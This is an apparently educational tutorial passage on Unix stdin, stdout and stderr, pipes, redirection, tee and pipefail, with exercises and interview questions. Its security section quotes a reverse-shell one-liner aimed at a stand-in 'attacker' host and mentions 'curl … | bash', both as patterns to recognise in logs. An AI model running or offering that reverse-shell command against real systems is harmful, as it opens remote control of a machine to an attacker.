<Callout type="tip" title="In one minute">
Every process has three **streams**: **stdin (0)** for input, **stdout (1)** for normal output, **stderr (2)** for errors. A **pipe** `|` connects one program's stdout to the next program's stdin: `cat access.log | grep 500 | wc -l`. **Redirection** sends streams to and from files: `>` overwrite, `>>` append, `2>` errors, `&> ` or `> file 2>&1` both, `<` read input from a file, `/dev/null` to discard. With these, small single-purpose tools combine into powerful one-liners.
</Callout>

## What is it?

### The three standard streams

When a program starts, the kernel gives it three open **file descriptors** (numbers that refer to open files or devices):

| FD | Name | Default | Used for |
| --- | --- | --- | --- |
| **0** | stdin (standard input) | Keyboard | Data the program reads |
| **1** | stdout (standard output) | Terminal | Normal results |
| **2** | stderr (standard error) | Terminal | Errors, warnings, progress messages |

```text
            ┌──────────────┐
 stdin  0 ─►│   program    ├─► 1 stdout
            │              ├─► 2 stderr
            └──────────────┘
```

stdout and stderr both appear on your screen, so they look the same — but they are **separate channels**. That separation is what lets you save results to a file while still seeing errors.

### The Unix philosophy

> Write programs that do one thing well. Write programs to work together. Write programs to handle text streams.

`grep` only filters lines. `sort` only sorts. `uniq` only collapses duplicates. `wc` only counts. Connected with pipes, they answer questions no single tool was designed for.

## Why does it matter?

- **Full-stack:** `npm run build 2>&1 | tee build.log`, `curl … | jq`, saving logs from a dev server, silencing noisy commands.
- **DevOps:** CI steps and Dockerfiles are full of pipes and redirects; container logging works by collecting **stdout/stderr** — which is why apps in Docker should log to stdout, not files.
- **Cloud:** `aws ec2 describe-instances | jq …`, `kubectl get pods -o json | jq …` — cloud CLIs are built to be piped.
- **Security:** log analysis ("top IPs with failed logins") is pipelines; so is a lot of attacker tradecraft (`curl … | bash`, reverse shells redirect stdin/stdout to a network socket). Understanding streams lets you read both.

## When and where do you use it?

- Counting, filtering and summarising logs.
- Saving a command's output to a file, or appending to a log.
- Hiding noise: `command > /dev/null 2>&1`.
- Feeding a file or a block of text into a program.
- Watching output and saving it at the same time with `tee`.
- Writing to a root-owned file with `sudo tee`.

## How does it work?

### Output redirection

| Syntax | Meaning |
| --- | --- |
| `cmd > file` | stdout to file (**overwrites**; creates if missing) |
| `cmd >> file` | stdout to file (**appends**) |
| `cmd 2> file` | stderr to file |
| `cmd 2>> file` | stderr appended |
| `cmd > out.txt 2> err.txt` | Split them |
| `cmd > file 2>&1` | Both to the same file (order matters — see below) |
| `cmd &> file` | Bash shortcut for both |
| `cmd &>> file` | Both, appended |
| `cmd > /dev/null` | Discard stdout |
| `cmd 2> /dev/null` | Discard errors |
| `cmd > /dev/null 2>&1` | Silence everything |

```bash
ls /etc /nope > out.txt          # list of /etc in out.txt; error still on screen
ls /etc /nope 2> err.txt         # list on screen; error in err.txt
ls /etc /nope > all.txt 2>&1     # both in all.txt
```

### Why the order of `2>&1` matters

`2>&1` means "make fd 2 point **where fd 1 points right now**". Redirections are processed left to right:

```text
cmd > file 2>&1     1 → file, then 2 → (where 1 points) = file       ✓ both in file
cmd 2>&1 > file     2 → (where 1 points) = terminal, then 1 → file   ✗ errors still on screen
```

### Input redirection

```bash
wc -l < access.log               # file as stdin (wc prints just a number, no filename)
mysql app < schema.sql           # feed SQL into a client
```

**Here document** — multi-line input written inline:

```bash
cat <<EOF > config.ini
[server]
host = $(hostname)
port = 8080
EOF
```

Quote the delimiter (`<<'EOF'`) to stop variables and `$(…)` from expanding — essential when writing scripts that contain `$` themselves. `<<-EOF` strips leading **tabs** for indented scripts.

**Here string** — one line of input:

```bash
grep -c "a" <<< "banana"         # 1 (one matching line)
read -r first rest <<< "hello big world"; echo "$first"
```

### Pipes

```bash
cmd1 | cmd2 | cmd3
```

All commands start **at the same time**; data flows through a small kernel buffer as it is produced. That is why `tail -f log | grep ERROR` works live, and why `yes | head -n 3` finishes instantly.

```text
cat access.log ──stdout→stdin── grep " 500 " ──→── awk '{print $1}' ──→── sort ──→── uniq -c ──→── sort -rn ──→── head
```

Only **stdout** goes through a pipe. To pipe errors too: `cmd 2>&1 | grep …` or `cmd |& grep …` (bash).

### Pipeline exit status

By default, a pipeline's exit status is that of the **last** command:

```bash
false | true; echo $?            # 0 — the failure was hidden
set -o pipefail
false | true; echo $?            # 1 — now any failure counts
echo "${PIPESTATUS[@]}"          # exit code of each command in the last pipeline
```

That is why `set -o pipefail` is in every script header.

### `tee` — split the stream

`tee` writes its input to a file **and** to stdout:

```bash
npm run build 2>&1 | tee build.log          # watch it and keep a copy
./deploy.sh 2>&1 | tee -a deploy.log        # -a appends

# Writing to a root-owned file: this FAILS, because the redirect is done by YOUR shell, not by sudo
sudo echo "1.2.3.4 api.local" >> /etc/hosts       # Permission denied
# This works: tee runs as root and does the writing
echo "1.2.3.4 api.local" | sudo tee -a /etc/hosts > /dev/null
```

### Command substitution and process substitution

```bash
today=$(date +%F)                         # capture output into a variable
echo "Kernel: $(uname -r)"

diff <(sort a.txt) <(sort b.txt)          # treat command output as a file
comm -13 <(sort old-users.txt) <(sort new-users.txt)   # users only in the new list
```

### Special files

| File | Behaviour |
| --- | --- |
| `/dev/null` | Discards everything written; reading gives nothing |
| `/dev/zero` | Endless zero bytes |
| `/dev/urandom` | Endless random bytes |
| `/dev/stdin`, `/dev/stdout`, `/dev/stderr` | The process's own streams as paths |
| `/dev/tcp/host/port` | Bash-only: a network connection as a file |

### Writing to stderr from your scripts

Messages for humans (errors, progress) belong on stderr, results on stdout — so others can pipe your script's output cleanly:

```bash
log()  { echo "[$(date +%T)] $*" >&2; }
die()  { echo "ERROR: $*" >&2; exit 1; }

log "Fetching users…"
[ -f users.csv ] || die "users.csv not found"
cut -d, -f1 users.csv                      # the actual result → stdout
```

## Hands-on

```bash
mkdir -p ~/streams && cd ~/streams

# 1. stdout vs stderr
ls /etc/hostname /does-not-exist
ls /etc/hostname /does-not-exist > out.txt
ls /etc/hostname /does-not-exist 2> err.txt
ls /etc/hostname /does-not-exist > both.txt 2>&1
head out.txt err.txt both.txt

# 2. Order of 2>&1
ls /does-not-exist 2>&1 > wrong.txt     # error still printed on screen
cat wrong.txt                           # empty

# 3. Append vs overwrite
echo one > notes.txt; echo two > notes.txt; cat notes.txt      # two
echo one > notes.txt; echo two >> notes.txt; cat notes.txt     # one, two

# 4. A real pipeline on fake access logs
for i in $(seq 1 200); do
  printf '10.0.0.%d - - [10/Nov/2026] "GET /api/%s HTTP/1.1" %s 512\n' \
    $((RANDOM % 6)) "$( [ $((RANDOM%3)) -eq 0 ] && echo login || echo items)" \
    "$( [ $((RANDOM%5)) -eq 0 ] && echo 500 || echo 200)"
done > access.log
head -n 3 access.log
grep -c '" 500 ' access.log                                      # how many errors?
grep '" 500 ' access.log | awk '{print $1}' | sort | uniq -c | sort -rn   # errors per IP
awk '{print $7}' access.log | sort | uniq -c                     # requests per path

# 5. Pipefail
grep "nothing-matches" access.log | wc -l; echo "status: $?"
set -o pipefail; grep "nothing-matches" access.log | wc -l; echo "status: $?"; set +o pipefail

# 6. Here-doc, quoted vs unquoted
cat <<EOF
User: $USER, home: $HOME
EOF
cat <<'EOF'
User: $USER, home: $HOME
EOF

# 7. Process substitution: compare two command outputs
diff <(ls /bin | head) <(ls /usr/bin | head)

cd ~ && rm -rf ~/streams
```

The same pipeline idea in JavaScript — each step takes the previous step's output:

```javascript
const log = `10.0.0.1 "GET /api/login" 500
10.0.0.2 "GET /api/items" 200
10.0.0.1 "GET /api/login" 500
10.0.0.3 "GET /api/items" 500
10.0.0.1 "GET /api/items" 200`;

// grep '500' | awk '{print $1}' | sort | uniq -c | sort -rn
const result = log
  .split("\n")                                  // lines
  .filter((line) => line.endsWith(" 500"))      // grep
  .map((line) => line.split(" ")[0])            // awk '{print $1}'
  .reduce((counts, ip) => ({ ...counts, [ip]: (counts[ip] ?? 0) + 1 }), {}); // uniq -c

console.log(Object.entries(result).sort((a, b) => b[1] - a[1]));          // sort -rn
```

## Real-world example

During an incident, a security engineer needs to know which IPs are brute-forcing the login endpoint and whether any succeeded — from 2 GB of Nginx logs, in a minute:

```bash
# Top 10 IPs with failed logins in today's log (including rotated, compressed files)
zcat -f /var/log/nginx/access.log* \
  | grep 'POST /api/login' \
  | awk '$9 == 401 {print $1}' \
  | sort | uniq -c | sort -rn | head -n 10 \
  | tee /tmp/bruteforce-top10.txt

# Did any of those IPs ever get a 200 on login?
awk '{print $2}' /tmp/bruteforce-top10.txt > /tmp/ips.txt
zcat -f /var/log/nginx/access.log* \
  | grep 'POST /api/login' \
  | grep -F -f /tmp/ips.txt \
  | awk '$9 == 200 {print $1, $4}'
```

No SIEM, no script file — just streams. The second result decides whether this is "block the IPs" or "an account was compromised: start incident response".

## Common mistakes

- **`> file` when you meant `>>`** — overwriting a log or config. Some engineers enable `set -o noclobber` so `>` refuses to overwrite existing files (`>|` forces it).
- **Reading and writing the same file in one pipeline**: `sort data.txt > data.txt` empties the file before `sort` reads it. Write to a temp file, then move it (or use `sponge` from moreutils).
- **`2>&1 > file` in the wrong order.**
- **`sudo echo … > /root-owned/file`** — the redirection is not run by sudo. Use `sudo tee`.
- **Ignoring pipeline failures** without `pipefail`.
- **Useless use of cat**: `cat file | grep x` works, but `grep x file` is simpler (harmless, but a classic review comment).
- **Scripts printing progress to stdout**, which corrupts their output when piped. Progress goes to stderr.

## Security lens

<Callout type="security">
Streams are how data and commands move between processes — including between an attacker and your server.
</Callout>

- **`curl … | bash`** runs whatever arrives, as you. A server can even detect piping and serve different content than what you see in the browser. Download, inspect, verify, then run.
- **Reverse shells** are just redirection: an attacker's payload connects a shell's stdin/stdout/stderr to a network socket (`bash -i >& /dev/tcp/attacker/4444 0>&1`). Detecting `bash -i` with network sockets, or web servers spawning shells, is a standard EDR rule. Recognising the pattern matters when you read suspicious commands in logs.
- **Secrets on stdout end up in logs.** CI systems store everything a job prints. Never `echo`/`cat` secrets, and be careful with `set -x`.
- **`/dev/null` hides evidence:** attackers append `> /dev/null 2>&1` to stay quiet; you should do the opposite — log what your scripts do.
- **Temporary files** created by redirection in shared directories like `/tmp` can be read or swapped by other users. Use `mktemp` (covered later) with restrictive permissions.

## Interview questions

<QA q="What are stdin, stdout and stderr?">
They are the three standard streams every process starts with, as file descriptors 0, 1 and 2. stdin is the input (keyboard by default), stdout is normal output and stderr is error and diagnostic output (both to the terminal by default). Keeping them separate lets you redirect or pipe results while still seeing errors.
</QA>

<QA q="What is the difference between > file 2>&1 and 2>&1 > file?">
Redirections are applied left to right, and 2>&1 copies wherever fd 1 currently points. In `> file 2>&1`, stdout goes to the file first and then stderr follows it, so both end up in the file. In `2>&1 > file`, stderr is pointed at the terminal (where stdout was) before stdout is moved to the file, so errors still appear on screen.
</QA>

<QA q="What does a pipe do, and do the commands run one after another?">
A pipe connects the stdout of one command to the stdin of the next through a kernel buffer. All commands in the pipeline run concurrently; each processes data as soon as it arrives, which is why pipelines can work on live or infinite streams such as tail -f.
</QA>

<QA q="Why does sudo echo text > /etc/file fail, and how do you fix it?">
The redirection is performed by your own unprivileged shell before sudo runs, so opening /etc/file fails. sudo only elevates the echo command. Use `echo text | sudo tee /etc/file` (or tee -a to append), so the program writing the file runs as root, or run a root shell with sudo sh -c "...".
</QA>

<QA q="What is set -o pipefail and why does it matter?">
By default a pipeline's exit status is that of the last command, so failures earlier in the pipeline are ignored. With pipefail, the pipeline returns the status of the last command that failed, so errors anywhere are detected by set -e, if statements and CI.
</QA>

## Key terms

<Terms>

  <Term name="File descriptor">A number a process uses to refer to an open file, socket or device.</Term>
  <Term name="Redirection">Sending a stream to or from a file with &gt;, &gt;&gt;, &lt; or 2&gt;.</Term>
  <Term name="Pipe">The | operator connecting one command's stdout to another's stdin.</Term>
